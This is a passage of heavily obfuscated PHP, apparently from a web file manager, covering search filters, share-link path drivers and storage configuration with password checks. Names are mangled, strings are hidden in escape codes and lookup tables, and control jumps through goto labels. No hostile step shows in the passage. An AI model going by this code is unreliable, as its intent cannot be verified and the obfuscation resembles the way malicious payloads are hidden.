$this->sourceInfo($ß”àáÙŒ); $ı´Ò¸ƒ = array($ë´úêØê[569] => array($ë´úêØê[443], $úÑò‘…²[$ë´úêØê[569]] . $úÑò‘…²[$ë´úêØê[184]] . $ë´úêØê[597])); $‡ãµŒ­ = $this->field($ë´úêØê[79])->where($ı´Ò¸ƒ)->limit($†÷¬É¥ß + 1)->select(); $÷àç¨„² = is_array($‡ãµŒ­) ? count($‡ãµŒ­) : 0; if ($÷àç¨„² > $†÷¬É¥ß) { return $this->_listSearchChildrenNear($ß”àáÙŒ, $†÷¬É¥ß); } $şßà—›Ä = $this->field($ë´úêØê[184])->where($ı´Ò¸ƒ)->select(); $¨§Æœ¾¨ = array_to_keyvalue($şßà—›Ä, $ë´úêØê[12], $ë´úêØê[184]); return $¨§Æœ¾¨; } private function _listSearchChildrenNear($†‚ÓŸ¦¡, $›ş´ê¦») { $‘Èˆ»ìÏ =& $_SERVER[º·Ï‹¥³]; $‹¡çè‡ = array(); $»›òÏ¥î = array($‘Èˆ»ìÏ[183] => $†‚ÓŸ¦¡); $çË½õÑ‘ = $this->field($‘Èˆ»ìÏ[2223])->where($»›òÏ¥î)->select(); $ÀõëéË« = array_to_keyvalue(array_filter_by_field($çË½õÑ‘, $‘Èˆ»ìÏ[469], $‘Èˆ»ìÏ[91]), $‘Èˆ»ìÏ[12], $‘Èˆ»ìÏ[184]); $‹¡çè‡ = array_merge($‹¡çè‡, array_to_keyvalue($çË½õÑ‘, $‘Èˆ»ìÏ[12], $‘Èˆ»ìÏ[184])); if (!$ÀõëéË«) { return $‹¡çè‡; } $»›òÏ¥î = array($‘Èˆ»ìÏ[183] => array($‘Èˆ»ìÏ[7], $ÀõëéË«)); $çË½õÑ‘ = $this->field($‘Èˆ»ìÏ[2223])->where($»›òÏ¥î)->limit($›ş´ê¦»)->select(); $‹¡çè‡ = array_merge($‹¡çè‡, array_to_keyvalue($çË½õÑ‘, $‘Èˆ»ìÏ[12], $‘Èˆ»ìÏ[184])); $‹¡çè‡ = array_slice($‹¡çè‡, 0, intval($›ş´ê¦»)); return $‹¡çè‡; } private function _listSearchBindPinyin($Ø±ë»Ê£, &$÷â€«éÎ, &$ ÆŒÎÕ) { $æğÕ‘µ =& $_SERVER[º·Ï‹¥³]; if (!isset($Ø±ë»Ê£[$æğÕ‘µ[2051]]) || !$Ø±ë»Ê£[$æğÕ‘µ[2051]]) { return; } if (!Input::check($Ø±ë»Ê£[$æğÕ‘µ[2051]], $æğÕ‘µ[369]) || strlen($Ø±ë»Ê£[$æğÕ‘µ[2051]]) < 2) { return; } $½‹²¹ü• = "\114\105\106\124\40\x4a\x4f\x49\x4e\x20{$this->tablePrefix}\151\x6f\137\x73\157\165\x72\x63\x65\x5f\x6d\145\x74\x61\x20\x6d\145\x74\x61\x20\157\x6e\x20\x73\157\x75\x72\143\x65\x2e\163\x6f\x75\162\x63\x65\x49\104\40\75\40\x6d\x65\164\x61\56\163\x6f\165\x72\x63\x65\111\x44"; $ˆ”»ßÕœ = array(); $ ÆŒÎÕ = str_replace(array($æğÕ‘µ[253], $æğÕ‘µ[53], $æğÕ‘µ[2224]), $æğÕ‘µ[12], $ ÆŒÎÕ); $ ÆŒÎÕ = $æğÕ‘µ[495] . str_replace($æğÕ‘µ[50], $æğÕ‘µ[496], $ ÆŒÎÕ); $èË¦øéÈ = $÷â€«éÎ[$æğÕ‘µ[32]]; unset($÷â€«éÎ[$æğÕ‘µ[32]]); foreach ($÷â€«éÎ as $ˆùÈº´Ë => $Ëñ³ÊÂ) { $ˆ”»ßÕœ[$æğÕ‘µ[495] . $ˆùÈº´Ë] = $Ëñ³ÊÂ; } foreach ($èË¦øéÈ as $”µø„¨ü) { $ˆ”»ßÕœ[] = array($æğÕ‘µ[500] => $”µø„¨ü, $æğÕ‘µ[1049] => $æğÕ‘µ[2055], array($æğÕ‘µ[2225] => $”µø„¨ü, $æğÕ‘µ[2226] => array($æğÕ‘µ[7], array($æğÕ‘µ[522], $æğÕ‘µ[521])))); } $this->join($½‹²¹ü•); $÷â€«éÎ = $ˆ”»ßÕœ; } private function _parseSearchWhere($‹î¬ÒËÃ) { $ù¢•¹ñ =& $_SERVER[º·Ï‹¥³]; $á›««˜² = array(); if (isset($‹î¬ÒËÃ[$ù¢•¹ñ[812]]) && $‹î¬ÒËÃ[$ù¢•¹ñ[812]]) { $á›««˜²[$ù¢•¹ñ[88]] = array($ù¢•¹ñ[2227], $‹î¬ÒËÃ[$ù¢•¹ñ[812]]); } if (isset($‹î¬ÒËÃ[$ù¢•¹ñ[813]]) && $‹î¬ÒËÃ[$ù¢•¹ñ[813]]) { $µµâÒó¶ = array($ù¢•¹ñ[2228], $‹î¬ÒËÃ[$ù¢•¹ñ[813]]); if ($á›««˜²[$ù¢•¹ñ[88]]) { $á›««˜²[$ù¢•¹ñ[88]] = array($á›««˜²[$ù¢•¹ñ[88]], $µµâÒó¶, $ù¢•¹ñ[2229]); } else { $á›««˜²[$ù¢•¹ñ[88]] = $µµâÒó¶; } } if (isset($‹î¬ÒËÃ[$ù¢•¹ñ[2221]]) && $‹î¬ÒËÃ[$ù¢•¹ñ[2221]] > 0) { $á›««˜²[$ù¢•¹ñ[79]] = array($ù¢•¹ñ[2227], $‹î¬ÒËÃ[$ù¢•¹ñ[2221]]); } if (isset($‹î¬ÒËÃ[$ù¢•¹ñ[2222]]) && $‹î¬ÒËÃ[$ù¢•¹ñ[2222]]) { $µµâÒó¶ = array($ù¢•¹ñ[2228], $‹î¬ÒËÃ[$ù¢•¹ñ[2222]]); if ($á›««˜²[$ù¢•¹ñ[79]]) { $á›««˜²[$ù¢•¹ñ[79]] = array($á›««˜²[$ù¢•¹ñ[79]], $µµâÒó¶, $ù¢•¹ñ[2229]); } else { $á›««˜²[$ù¢•¹ñ[79]] = $µµâÒó¶; } } if (isset($‹î¬ÒËÃ[$ù¢•¹ñ[646]]) && $‹î¬ÒËÃ[$ù¢•¹ñ[646]]) { $á›««˜²[] = array($ù¢•¹ñ[513] => $‹î¬ÒËÃ[$ù¢•¹ñ[646]], $ù¢•¹ñ[511] => $‹î¬ÒËÃ[$ù¢•¹ñ[646]], $ù¢•¹ñ[1049] => $ù¢•¹ñ[2055]); } if (isset($‹î¬ÒËÃ[$ù¢•¹ñ[470]]) && $‹î¬ÒËÃ[$ù¢•¹ñ[470]]) { $ŒäÍŠİû = $‹î¬ÒËÃ[$ù¢•¹ñ[470]]; if ($ŒäÍŠİû == $ù¢•¹ñ[78]) { $á›««˜²[$ù¢•¹ñ[469]] = 1; } else { if ($ŒäÍŠİû == $ù¢•¹ñ[2230]) { $á›««˜²[$ù¢•¹ñ[469]] = 0; } else { if ($ŒäÍŠİû) { $ŒäÍŠİû = is_array($ŒäÍŠİû) ? $ŒäÍŠİû : explode($ù¢•¹ñ[50], $ŒäÍŠİû); $á›««˜²[$ù¢•¹ñ[470]] = array($ù¢•¹ñ[476], $ŒäÍŠİû); $á›««˜²[$ù¢•¹ñ[469]] = 0; } } } } $this->_parseSearchParent($‹î¬ÒËÃ, $á›««˜²); if (isset($‹î¬ÒËÃ[$ù¢•¹ñ[2051]]) && trim($‹î¬ÒËÃ[$ù¢•¹ñ[2051]])) { $Ğìä¹È = trim($‹î¬ÒËÃ[$ù¢•¹ñ[2051]]); $Œâ±â Ò = explode($ù¢•¹ñ[53], $Ğìä¹È); if (strlen($Ğìä¹È) > 2 && (substr($Ğìä¹È, 0, 1) == $ù¢•¹ñ[121] && substr($Ğìä¹È, -1) == $ù¢•¹ñ[121]) || substr($Ğìä¹È, 0, 1) == $ù¢•¹ñ[58] && substr($Ğìä¹È, -1) == $ù¢•¹ñ[58]) { $Ğìä¹È = substr($Ğìä¹È, 1, -1); $Œâ±â Ò = array($Ğìä¹È); } $á›««˜²[$ù¢•¹ñ[32]] = array(array($ù¢•¹ñ[596], $ù¢•¹ñ[2053] . $Ğìä¹È . $ù¢•¹ñ[2053])); if (count($Œâ±â Ò) > 1) { $á›««˜²[$ù¢•¹ñ[32]] = array(); foreach ($Œâ±â Ò as $ÄúÒÚ›Ø) { if (!trim($ÄúÒÚ›Ø)) { continue; } $á›««˜²[$ù¢•¹ñ[32]][] = array($ù¢•¹ñ[596], $ù¢•¹ñ[2053] . trim($ÄúÒÚ›Ø) . $ù¢•¹ñ[2053]); } } } return $á›««˜²; } private function _parseSearchParent($‡¯ ã¾Ï, &$™Ÿ¼Ğ) { $ÖßÅœÁ =& $_SERVER[º·Ï‹¥³]; if (!isset($‡¯ ã¾Ï[$ÖßÅœÁ[183]]) || !$‡¯ ã¾Ï[$ÖßÅœÁ[183]]) { return; } $·Ìª½§ = $this->pathInfo($‡¯ ã¾Ï[$ÖßÅœÁ[183]]); $ù¸á¯û¹ = $·Ìª½§[$ÖßÅœÁ[183]] . $ÖßÅœÁ[12] === $ÖßÅœÁ[219]; $¦¦€”òÁ = $·Ìª½§[$ÖßÅœÁ[181]] == $ÖßÅœÁ[563]; if ($·Ìª½§[$ÖßÅœÁ[580]] == $ÖßÅœÁ[581]) { $ôˆ‡ì´û = $this->sourceInfo($‡¯ ã¾Ï[$ÖßÅœÁ[183]]); $·Ìª½§[$ÖßÅœÁ[569]] = $ôˆ‡ì´û[$ÖßÅœÁ[569]]; } $™Ÿ¼Ğ[$ÖßÅœÁ[636]] = array($ÖßÅœÁ[596], $·Ìª½§[$ÖßÅœÁ[569]] . $‡¯ ã¾Ï[$ÖßÅœÁ[183]] . $ÖßÅœÁ[597]); $çïÀ±ïİ = isset($‡¯ ã¾Ï[$ÖßÅœÁ[1911]]) && in_array($ÖßÅœÁ[563], $‡¯ ã¾Ï[$ÖßÅœÁ[1911]]); if (!$çïÀ±ïİ || !$¦¦€”òÁ || !$ù¸á¯û¹ || !$·Ìª½§[$ÖßÅœÁ[471]]) { return; } if (!AuthModel::authCheckRoot($·Ìª½§[$ÖßÅœÁ[471]][$ÖßÅœÁ[472]])) { return; } $£Ş«¼ï³ = $·Ìª½§[$ÖßÅœÁ[554]] . $ÖßÅœÁ[12]; if ($£Ş«¼ï³ == $ÖßÅœÁ[91]) { unset($™Ÿ¼Ğ[$ÖßÅœÁ[636]]); $™Ÿ¼Ğ[$ÖßÅœÁ[181]] = self::TYPE_GROUP; return; } $Ñ„ãé®‰ = Model($ÖßÅœÁ[570])->groupChildrenAll($£Ş«¼ï³); $ã˜òÍŞà = count($Ñ„ãé®‰); if ($ã˜òÍŞà <= 1) { return; } $Ë¡„İÇû = array($ÖßÅœÁ[183] => 0, $ÖßÅœÁ[181] => self::TYPE_GROUP, $ÖßÅœÁ[554] => array($ÖßÅœÁ[7], $Ñ„ãé®‰)); $Ë‡ëûıó = $this->field($ÖßÅœÁ[2231])->where($Ë¡„İÇû)->limit($ã˜òÍŞà)->select(); $™Ÿ¼Ğ[$ÖßÅœÁ[636]] = array(); foreach ($Ë‡ëûıó as $ıÕƒÔ²æ) { $™Ÿ¼Ğ[$ÖßÅœÁ[636]][] = array($ÖßÅœÁ[596], $ÖßÅœÁ[579] . $ıÕƒÔ²æ[$ÖßÅœÁ[184]] . $ÖßÅœÁ[597]); } $™Ÿ¼Ğ[$ÖßÅœÁ[636]][] = $ÖßÅœÁ[2055]; } } goto dØ¬¸Ö¸îÁ; EèÙÑºİóî: class PathDriverDriverShareItem { public function __construct($½ÍÃ«Â) { $this->pathParse = $½ÍÃ«Â; } public function __call($Èœƒ§ŞĞ, $‚´Œï±¨) { $Óûš¢¤ú =& $_SERVER[º·Ï‹¥³]; if (method_exists($this, $Èœƒ§ŞĞ)) { return; } $°Ü¬ Ñ¶ = call_user_func_array(array($Óûš¢¤ú[1397], $Èœƒ§ŞĞ), $‚´Œï±¨); $šÊ–÷Øö = array($Óûš¢¤ú[1398], $Óûš¢¤ú[1399], $Óûš¢¤ú[1400], $Óûš¢¤ú[1401], $Óûš¢¤ú[602], $Óûš¢¤ú[604], $Óûš¢¤ú[1402], $Óûš¢¤ú[110], $Óûš¢¤ú[1403], $Óûš¢¤ú[1404]); if (in_array($Èœƒ§ŞĞ, $šÊ–÷Øö)) { $°Ü¬ Ñ¶ = $this->getPathOuter($°Ü¬ Ñ¶); } return $°Ü¬ Ñ¶; } public function copy($á¡šËÊ­, $Ë¥•Ó­Å, $…ø–ƒ… = false, $Ü÷·‰Øı = false) { return $this->copyMove($á¡šËÊ­, $Ë¥•Ó­Å, $…ø–ƒ…, $_SERVER[º·Ï‹¥³][602], $Ü÷·‰Øı); } public function move($Ù•Øë‚š, $±Ï²í‰¤, $ÔğÒöÏê = false, $ÊÃ¨ÛÖ = false) { return $this->copyMove($Ù•Øë‚š, $±Ï²í‰¤, $ÔğÒöÏê, $_SERVER[º·Ï‹¥³][604], $ÊÃ¨ÛÖ); } private function copyMove($’³¨‚¡, $‡­ê§ ‰, $¿³»¡åğ, $ÒáåûïÜ, $Šì“¾ôĞ = false) { $¶´Å¹ş” =& $_SERVER[º·Ï‹¥³]; $´ŞÂ²Ù° = $‡­ê§ ‰; $§íê ­› = IO::driverMake($‡­ê§ ‰); if ($§íê ­›->pathParse[$¶´Å¹ş”[1203]]) { $‡­ê§ ‰ = $§íê ­›->pathParse[$¶´Å¹ş”[1203]]; } else { $‡­ê§ ‰ = $´ŞÂ²Ù°; } $Ô üğ›ä = IO::copyMove($’³¨‚¡, $‡­ê§ ‰, $¿³»¡åğ, $ÒáåûïÜ, $Šì“¾ôĞ); $Ô üğ›ä = $this->getPathOuter($Ô üğ›ä); return $Ô üğ›ä; } public function pathThis($Ò»‘ë’ü) { return get_path_this($this->pathParse[$_SERVER[º·Ï‹¥³][87]]); } public function pathFather($ÓÕû´) { return get_path_father($this->pathParse[$_SERVER[º·Ï‹¥³][87]]); } public function iconvSystem($æí¬§–­) { return $æí¬§–­; } protected function infoParse($ÙÃµÓìŸ, $Æ‡­¸Ç¢ = false) { $”ñÔÒĞÌ =& $_SERVER[º·Ï‹¥³]; $È®èò = $this->pathParse[$”ñÔÒĞÌ[545]][$”ñÔÒĞÌ[1228]] . $this->pathParse[$”ñÔÒĞÌ[1221]]; if ($Æ‡­¸Ç¢) { $Ò£ì•–¨ = IO::infoWithChildren($È®èò); } else { $Ò£ì•–¨ = IO::info($È®èò); } $»‰­êÜ = $this->pathParse[$”ñÔÒĞÌ[545]]; return Action($”ñÔÒĞÌ[1395])->_shareItemeParse($Ò£ì•–¨, $»‰­êÜ); } public function listAll($˜©÷óìĞ) { $ù’ÍÉíÊ =& $_SERVER[º·Ï‹¥³]; $õÎŒÆÕÆ = IO::listAll($˜©÷óìĞ); $‹õÌòßİ = rtrim($this->pathParse[$ù’ÍÉíÊ[545]][$ù’ÍÉíÊ[1228]], $ù’ÍÉíÊ[8]); foreach ($õÎŒÆÕÆ as &$°¼«¼ü×) { $°¼«¼ü×[$ù’ÍÉíÊ[87]] = $this->pathDriver . $ù’ÍÉíÊ[8] . ltrim(substr($°¼«¼ü×[$ù’ÍÉíÊ[87]], strlen($‹õÌòßİ)), $ù’ÍÉíÊ[8]); } unset($°¼«¼ü×); return $õÎŒÆÕÆ; } public function listAllSimple($”ü–§‚, $—¡ùûº° = false) { $¾§µ¸ã“ =& $_SERVER[º·Ï‹¥³]; $ˆİ³æ¶Í = $this->listAll($”ü–§‚); $¯¨ÜÆ¨± = $this->pathParse[$¾§µ¸ã“[479]]; if (trim($¯¨ÜÆ¨±, $¾§µ¸ã“[8]) == trim(get_path_father($¯¨ÜÆ¨±), $¾§µ¸ã“[8])) { $—¡ùûº° = !0; } return IO::init($¾§µ¸ã“[12])->listAllSimpleMake($ˆİ³æ¶Í, $¯¨ÜÆ¨±, $—¡ùûº°); } public function getPathOuter($ò—Ò“±İ) { $™ ™ĞÜŠ =& $_SERVER[º·Ï‹¥³]; $×•á–¾ = KodIO::parse($ò—Ò“±İ); if ($×•á–¾[$™ ™ĞÜŠ[33]] == KodIO::KOD_SHARE_ITEM) { return $×•á–¾[$™ ™ĞÜŠ[87]]; } $Ô‡Ñ‘ø = KodIO::clear($ò—Ò“±İ); $“ğüîÍÑ = KodIO::clear($this->pathParse[$™ ™ĞÜŠ[545]][$™ ™ĞÜŠ[1228]]); $Ö»›‰îõ = substr($Ô‡Ñ‘ø, strlen($“ğüîÍÑ)); if (substr($Ô‡Ñ‘ø, 0, strlen($“ğüîÍÑ)) != $“ğüîÍÑ) { return !1; } return $this->pathParse[$™ ™ĞÜŠ[1222]] . $™ ™ĞÜŠ[8] . ltrim($Ö»›‰îõ, $™ ™ĞÜŠ[8]); } public function getType() { $ÍµúéúÈ =& $_SERVER[º·Ï‹¥³]; $§œ·õ˜ = str_replace($ÍµúéúÈ[77], $ÍµúéúÈ[12], get_class($this)); return strtolower($§œ·õ˜); } public function isOsDriver($ƒô¿¢”Ã) { return IO::isOsDriver($ƒô¿¢”Ã); } public function info($áÑ‚‹¾İ) { return $this->infoParse($áÑ‚‹¾İ); } public function infoAuth($ø¨»×©õ) { return $this->infoParse($ø¨»×©õ); } public function infoWithChildren($ˆÔŠü‚) { return $this->infoParse($ˆÔŠü‚, !0); } public function infoFull($†ëÂÅÊâ) { return $this->infoParse($†ëÂÅÊâ); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($Êìóõ) { $this->pathParse = $Êìóõ; } protected function infoParse($öú™Î„‰, $±ŒˆÉ¸ = false) { $ÜÆûç„Ÿ =& $_SERVER[º·Ï‹¥³]; return Action($ÜÆûç„Ÿ[1227])->sharePathInfo($this->pathParse[$ÜÆûç„Ÿ[87]], !0, $±ŒˆÉ¸); } public function listPath($Ôûëµö…, $ì‘ğË› = false) { $ëÃÔå¡Ü =& $_SERVER[º·Ï‹¥³]; $õÕ…ƒßÔ = IO::listPath($Ôûëµö…, $ì‘ğË›); if (!$õÕ…ƒßÔ) { return $õÕ…ƒßÔ; } if (is_array($õÕ…ƒßÔ[$ëÃÔå¡Ü[1396]])) { $Ãê’Üù = Action($ëÃÔå¡Ü[1405])->parsePathChildren($õÕ…ƒßÔ[$ëÃÔå¡Ü[1396]], array($ëÃÔå¡Ü[479] => $Ôûëµö…)); $õÕ…ƒßÔ[$ëÃÔå¡Ü[1396]] = Action($ëÃÔå¡Ü[1227])->shareItemInfo($Ãê’Üù); } foreach ($õÕ…ƒßÔ as $µí÷®èØ => $†àöëøÅ) { if (!in_array($µí÷®èØ, array($ëÃÔå¡Ü[86], $ëÃÔå¡Ü[85]))) { continue; } foreach ($†àöëøÅ as $ÅÀø§÷ => $Ãê’Üù) { $Ãê’Üù = Action($ëÃÔå¡Ü[1405])->parsePathChildren($Ãê’Üù, array($ëÃÔå¡Ü[479] => $Ôûëµö…)); $õÕ…ƒßÔ[$µí÷®èØ][$ÅÀø§÷] = Action($ëÃÔå¡Ü[1227])->shareItemInfo($Ãê’Üù); } } return $õÕ…ƒßÔ; } } class PathDriverEDS extends PathDriverBaseS3 { public function __construct($µ“ä¤—¡) { parent::__construct($µ“ä¤—¡); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto A´½¬ù’„˜; c„öâèğ®ã: function binCheckBigger($¨ê’¼Ä­, $ò¬‘´ƒ) { return $¨ê’¼Ä­ > $ò¬‘´ƒ; } $_SERVER[$_SERVER[ÊÀÖ©“][3]] = (base64_decode('ODQ4Mg==')."\66\61")+0;$_1f7r="rjf8n76t254zagceymbs39hudlxo0q1wivkp5bdkclags39081jivu7zq2tw6yonf4mepxh";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($¡ôı×, $”Ä÷°Ä) { $—Ô‹Õ¥å =& $_SERVER[º·Ï‹¥³]; if (isset(self::$_methodList[$¡ôı×])) { return @call_user_func_array(self::$_methodList[$¡ôı×], $”Ä÷°Ä); } else { if (method_exists($this, $¡ôı×)) { return call_user_func_array(array($this, $¡ôı×), $”Ä÷°Ä); } else { think_exception(__CLASS__ . $—Ô‹Õ¥å[4] . $¡ôı× . $—Ô‹Õ¥å[5]); } } } public static function __callStatic($¶¤¡ŞòŞ, $“Üİ»”Ú) { if (isset(self::$_methodListStatic[$¶¤¡ŞòŞ])) { return call_user_func_array(self::$_methodListStatic[$¶¤¡ŞòŞ], $“Üİ»”Ú); } else { if (method_exists(self, $¶¤¡ŞòŞ)) { return call_user_func_array(array(self, $¶¤¡ŞòŞ), $“Üİ»”Ú); } else { show_json("{$¶¤¡ŞòŞ}\50\x29\x20\156\x6f\x74\40\x65\x78\151\163\164\x3b", !1); } } } public static function addMethod($Ñû½Û¢ø, $ê’İ¦³µ) { self::$_methodList[$Ñû½Û¢ø] = $ê’İ¦³µ; } public static function addMethodStatic($–ß‹¿Ó’, $Ëª‘ø¹) { self::$_methodListStatic[$–ß‹¿Ó’] = $Ëª‘ø¹; } } goto bôÕŞõ¥ƒŸ; Dòµîï¹Ö˜: class StorageModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\x6d\x2e\x73\164\157\162\x61\x67\x65\x4c\x69\x73\x74"; public $field = array("\156\x61\x6d\x65", "\163\x69\172\145\115\141\170", "\x73\171\x73\x74\x65\x6d", "\x64\145\x66\141\165\154\x74", "\144\x72\151\x76\145\162", "\x63\157\x6e\146\151\147"); public function listData($¤ØµÄ— = false, $ÚÜ½šÚ÷ = "\x6d\x6f\x64\x69\x66\x79\x54\151\155\145", $Ç•’ éö = false) { $Ëİ’Ì¶¥ =& $_SERVER[º·Ï‹¥³]; $îÛ§‘ÅØ = parent::listData($¤ØµÄ—, $ÚÜ½šÚ÷, $Ç•’ éö); if ($¤ØµÄ—) { return $îÛ§‘ÅØ; } $£ôˆ£ = array(); if ($GLOBALS[$Ëİ’Ì¶¥[2281]]) { $£ôˆ£ = $this->ioSizeUseGet(array_to_keyvalue($îÛ§‘ÅØ, $Ëİ’Ì¶¥[12], $Ëİ’Ì¶¥[459])); } foreach ($îÛ§‘ÅØ as $ĞÊÖ¶Òà => $ĞÍ¶ïĞÑ) { unset($îÛ§‘ÅØ[$ĞÊÖ¶Òà][$Ëİ’Ì¶¥[6]]); $îÛ§‘ÅØ[$ĞÊÖ¶Òà][$Ëİ’Ì¶¥[1941]] = isset($£ôˆ£[$ĞÍ¶ïĞÑ[$Ëİ’Ì¶¥[459]]]) ? $£ôˆ£[$ĞÍ¶ïĞÑ[$Ëİ’Ì¶¥[459]]] : 0; } return $îÛ§‘ÅØ; } public function ioSizeUseGet($É”‡¹¡ù) { $Ï¼ıÃí€ =& $_SERVER[º·Ï‹¥³]; if (!$É”‡¹¡ù) { return array(); } $ŒÄÁº»š = $Ï¼ıÃí€[2282] . implode($Ï¼ıÃí€[50], $É”‡¹¡ù); $Ï×ôò = Cache::get($ŒÄÁº»š); if ($Ï×ôò) { return $Ï×ôò; } $î‚ª“É” = array($Ï¼ıÃí€[868] => $Ï¼ıÃí€[459], $Ï¼ıÃí€[2283] => $Ï¼ıÃí€[79]); $ıŸ§¾ÙÉ = array($Ï¼ıÃí€[868] => array($Ï¼ıÃí€[7], $É”‡¹¡ù)); $Ï×ôò = Model($Ï¼ıÃí€[840])->field($î‚ª“É”)->where($ıŸ§¾ÙÉ)->group($Ï¼ıÃí€[868])->select(); $Ï×ôò = array_to_keyvalue($Ï×ôò, $Ï¼ıÃí€[459], $Ï¼ıÃí€[79]); Cache::set($ŒÄÁº»š, $Ï×ôò, 600); return $Ï×ôò; } public function getConfig($¦çŸÄ) { $û¯¼¦°µ = parent::listData($¦çŸÄ); return json_decode($û¯¼¦°µ[$_SERVER[º·Ï‹¥³][6]], !0); } public function update($Ê²íÜïº, $÷‡½ØÎ´) { $„ªÀ¤ì =& $_SERVER[º·Ï‹¥³]; $Ä´Ÿ¬®š = $÷‡½ØÎ´[$„ªÀ¤ì[32]]; $ÚÏ°Äğ¢ = array_to_keyvalue(parent::listData(), $„ªÀ¤ì[32]); if (isset($ÚÏ°Äğ¢[$Ä´Ÿ¬®š]) && $ÚÏ°Äğ¢[$Ä´Ÿ¬®š][$„ªÀ¤ì[459]] != $Ê²íÜïº) { return !1; } $this->checkPwd($Ê²íÜïº, $÷‡½ØÎ´); if (isset($÷‡½ØÎ´[$„ªÀ¤ì[2284]]) && $÷‡½ØÎ´[$„ªÀ¤ì[2284]] == $„ªÀ¤ì[91]) { $this->checkConfig($÷‡½ØÎ´); } unset($÷‡½ØÎ´[$„ªÀ¤ì[2284]]); $ø¬òûÜ = parent::update($Ê²íÜïº, $÷‡½ØÎ´); if ($ø¬òûÜ && $÷‡½ØÎ´[$„ªÀ¤ì[37]]) { $€çõœƒ = 0; foreach ($ÚÏ°Äğ¢ as $¬Ö·«·„) { if ($¬Ö·«·„[$„ªÀ¤ì[37]] && $¬Ö·«·„[$„ªÀ¤ì[459]] != $Ê²íÜïº) { $€çõœƒ = $¬Ö·«·„[$„ªÀ¤ì[459]]; parent::update($¬Ö·«·„[$„ªÀ¤ì[459]], array($„ªÀ¤ì[37] => 0)); } } $this->updateBackup($Ê²íÜïº, $€çõœƒ); } return $ø¬òûÜ; } public function add($ãÇññü×) { $äÎÖ®¬Î =& $_SERVER[º·Ï‹¥³]; $æ»É×Â = array_to_keyvalue(parent::listData(), $äÎÖ®¬Î[32]); if (isset($æ»É×Â[$ãÇññü×[$äÎÖ®¬Î[32]]])) { return !1; } $this->checkConfig($ãÇññü×); $‹şÊ†äÜ = parent::insert($ãÇññü×); if ($‹şÊ†äÜ && $ãÇññü×[$äÎÖ®¬Î[37]]) { foreach ($æ»É×Â as $§ÕÈ†å•) { if ($§ÕÈ†å•[$äÎÖ®¬Î[37]]) { parent::update($§ÕÈ†å•[$äÎÖ®¬Î[459]], array($äÎÖ®¬Î[37] => 0)); } } } return $‹şÊ†äÜ; } public function updateBackup($ã¯ö€Ìµ, $Ëé¡±ÍÆ) { $ÓÓç½Ó =& $_SERVER[º·Ï‹¥³]; if (!$Ëé¡±ÍÆ) { return; } $‹Û¢â = Model($ÓÓç½Ó[801])->config(); if ($‹Û¢â[$ÓÓç½Ó[1724]] != $ÓÓç½Ó[91] || $‹Û¢â[$ÓÓç½Ó[803]] != $Ëé¡±ÍÆ) { return; } $¯úÁË = Model($ÓÓç½Ó[822])->get($ÓÓç½Ó[834]); $¯úÁË = json_decode($¯úÁË, !0); if (!$¯úÁË) { return; } $¯úÁË[$ÓÓç½Ó[803]] = $ã¯ö€Ìµ; Model($ÓÓç½Ó[822])->set(array($ÓÓç½Ó[834] => $¯úÁË)); } public function checkPwd($–¥îÎ¯à, &$æ‚†³¯—) { $é¿¯¥¢• =& $_SERVER[º·Ï‹¥³]; if (empty($æ‚†³¯—[$é¿¯¥¢•[6]])) { return; } $–ÚÇæâó = json_decode($æ‚†³¯—[$é¿¯¥¢•[6]], !0); $Öß™Õ© = $é¿¯¥¢•[12]; $Í×Âä = array($é¿¯¥¢•[2285], $é¿¯¥¢•[2286], $é¿¯¥¢•[938]); foreach ($Í×Âä as $‰åÜ¿µõ) { if (isset($–ÚÇæâó[$‰åÜ¿µõ])) { $Öß™Õ© = $‰åÜ¿µõ; break; } } if (!$Öß™Õ©) { return; } $îá»¢º÷ = $this->getConfig($–¥îÎ¯à); $é–‘ÓÑ = $îá»¢º÷[$Öß™Õ©]; $¬ˆè•Åí = $–ÚÇæâó[$Öß™Õ©]; if ($¬ˆè•Åí == str_repeat($é¿¯¥¢•[211], strlen($é–‘ÓÑ))) { $–ÚÇæâó[$Öß™Õ©] = $é–‘ÓÑ; $æ‚†³¯—[$é¿¯¥¢•[6]] = json_encode($–ÚÇæâó); } else { if ($¬ˆè•Åí != $é–‘ÓÑ) { $æ‚†³¯—[$é¿¯¥¢•[2284]] = $é¿¯¥¢•[91]; } } } public function checkConfig(&$Ÿˆêó¨, $è²‘œÀ¦ = false) { $Ïş »Äå =& $_SERVER[º·Ï‹¥³]; $Ä‹‚™ß = strtolower($Ÿˆêó¨[$Ïş »Äå[98]]); $±ãõˆ» = json_decode($Ÿˆêó¨[$Ïş »Äå[6]], !0); foreach ($±ãõˆ» as $»ÂíùæÇ => $ªÕêÊĞ) { if (is_string($ªÕêÊĞ)) { $±ãõˆ»[$»ÂíùæÇ] = trim($ªÕêÊĞ); } } $±ãõˆ»[$Ïş »Äå[2287]] = rand_string(6); $±óÚÙ“ã = $GLOBALS[$Ïş »Äå[6]][$Ïş »Äå[92]][$Ïş »Äå[877]]; $¾¯Şòïè = isset($±óÚÙ“ã[$Ä‹‚™ß]) ? $±óÚÙ“ã[$Ä‹‚™ß] : ucfirst($Ä‹‚™ß); $ÕÎğİâŸ = $Ïş »Äå[77] . $¾¯Şòïè; if (!$¾¯Şòïè || !class_exists($ÕÎğİâŸ)) { if ($è²‘œÀ¦) { return LNG($Ïş »Äå[2288]); } write_log(array($Ïş »Äå[2289], $Ÿˆêó¨, get_caller_info()), $Ïş »Äå[206]); show_json(LNG($Ïş »Äå[2288]), !1, $Ÿˆêó¨); } $øîïå‘ = new $ÕÎğİâŸ($±ãõˆ»); if (in_array($Ä‹‚™ß, $øîïå‘->objectDriver)) { try { if (!$øîïå‘->isBucketCors() && !$øîïå‘->setBucketCors()) { $¶‚ÚÓŞ = LNG($Ïş »Äå[2290]); $¶‚ÚÓŞ .= $Ïş »Äå[2291] . LNG($Ïş »Äå[2292]); } } catch (Exception $¶›ğŞÍÉ) { $¶‚ÚÓŞ = $¶›ğŞÍÉ->getMessage(); } if (isset($¶‚ÚÓŞ)) { return $this->_parseError($¶‚ÚÓŞ, $Ä‹‚™ß, $è²‘œÀ¦); } } $”Î²‚Ô† = rtrim($±ãõˆ»[$Ïş »Äå[1233]], $Ïş »Äå[8]) . $Ïş »Äå[8]; $ÌûÇÌ = $øîïå‘->getPath($”Î²‚Ô† . $Ïş »Äå[1237]); try { $şúï§Æñ = 